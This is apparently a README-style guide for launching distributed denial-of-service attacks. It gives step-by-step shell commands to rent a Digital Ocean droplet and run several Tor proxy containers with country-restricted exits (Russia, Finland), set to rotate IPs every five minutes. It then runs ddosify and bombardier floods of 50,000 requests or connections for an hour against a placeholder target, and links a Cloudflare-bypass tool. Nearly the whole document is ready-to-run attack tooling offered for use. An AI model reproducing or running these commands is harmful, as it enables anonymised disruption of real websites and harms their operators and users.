# DDoS with Docker, Digital Ocean, TOR.

## Prepare Digital Ocean droplet (Ubuntu)

### Create a new droplet

https://docs.digitalocean.com/products/droplets/how-to/create/

### Allow SSH connections

```sh
sed -i 's/#PubkeyAuthentication/PubkeyAuthentication/g' /etc/ssh/sshd_config && sudo service sshd restart
```

### Install docker

```sh
sudo apt update
sudo apt install -y apt-transport-https ca-certificates curl software-properties-common
curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -
sudo add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu focal stable"
apt-cache policy docker-ce
sudo apt install -y docker-ce
sudo systemctl status docker
sudo usermod -aG docker ${USER}
```

### Create tor config files for different exits

Base config
```sh
cat <<EOF > /root/torrc
AutomapHostsOnResolve 1
ControlPort 9051
ControlSocket /etc/tor/run/control
ControlSocketsGroupWritable 1
CookieAuthentication 1
CookieAuthFile /etc/tor/run/control.authcookie
CookieAuthFileGroupReadable 1
DNSPort 5353
DataDirectory /var/lib/tor
ExitPolicy reject *:*
Log notice stderr
RunAsDaemon 0
SocksPort 0.0.0.0:9050 IsolateDestAddr
TransPort 0.0.0.0:9040
User tor
VirtualAddrNetworkIPv4 10.192.0.0/10
EOF
```

Config with tor exit IPs only to Russia
```sh
cp -f /root/torrc /root/torrc_ru
cat <<EOF >>/root/torrc_ru
ExitNodes {ru} StrictNodes 1
EOF
```

Config with tor exit IPs only to Finland
```sh
cp -f /root/torrc /root/torrc_fin
cat <<EOF >>/root/torrc_fin
ExitNodes {fi} StrictNodes 1
EOF
```

### Create and Run tor-proxy docker containers

#### With random tor exits

```sh
for i in $(seq 0 6); do docker create --name tor${i} -it --restart=always -p $(expr 8118 + ${i}):8118 -p $(expr 9050 + ${i}):9050 dperson/torproxy; done
for i in $(seq 0 6); do docker start tor${i}; done
```

#### With Russian tor exits

```sh
for i in $(seq 0 6); do docker create --name tor${i} -it --restart=always \
    -p $(expr 8118 + ${i}):8118 -p $(expr 9050 + ${i}):9050 \
    -v /root/torrc_ru:/etc/tor/torrc:ro dperson/torproxy \
    ; done
for i in $(seq 0 6); do docker start tor${i}; done
```

#### With Finland tor exits

```sh
for i in $(seq 0 6); do docker create --name tor${i} -it --restart=always \
    -p $(expr 8118 + ${i}):8118 -p $(expr 9050 + ${i}):9050 \
    -v /root/torrc_fin:/etc/tor/torrc:ro dperson/torproxy \
    ; done
for i in $(seq 0 6); do docker start tor${i}; done
```

## Configure tor-proxy ip rotation.

1. Run `crontab -e`
2. Select any proposed editor (only for a first run)
3. Add next line to the end `*/5 * * * * for i in $(seq 0 6); do docker restart tor${i} >/dev/null 2>&1; done`

Note, added cron task will reload tor every 5 minutes. Tor network reloading takes about 1 minute.

## Run DDoS

**Note, run one DDoS tool per droplet!**

### Run/re-run tool - DDOSIFY

```sh
for i in $(seq 1 5); do docker kill attack${i}; done
for i in $(seq 1 5); do docker rm attack${i}; done

for i in $(seq 1 5); do docker create --name attack${i} -it --restart=always --network="host" \
    ddosify/ddosify /bin/ddosify -P "http://localhost:$(expr 8118 + ${i})" -T 10 -n 50000 -d 3600 -p HTTPS -m GET -l linear -t <TARGET_TO_ATTACK> \
    ; done

for i in $(seq 1 5); do docker start attack${i}; done
```

### Run/re-run tool - BOMBARDIER

```sh
for i in $(seq 1 5); do docker kill attack${i}; done
for i in $(seq 1 5); do docker rm attack${i}; done

for i in $(seq 1 5); do docker create --name attack${i} -it --restart=always --network="host" \
    --env="https_proxy=http://localhost:$(expr 8118 + ${i})" \
    --env="http_proxy=http://localhost:$(expr 8118 + ${i})" \
    alpine/bombardier -c 50000 -d 1h -l <TARGET_TO_ATTACK> \
    ; done

for i in $(seq 1 5); do docker start attack${i}; done
````

### Run/re-run tool - CF-BYPASS

https://github.com/code-ashram/anonymous-ddos
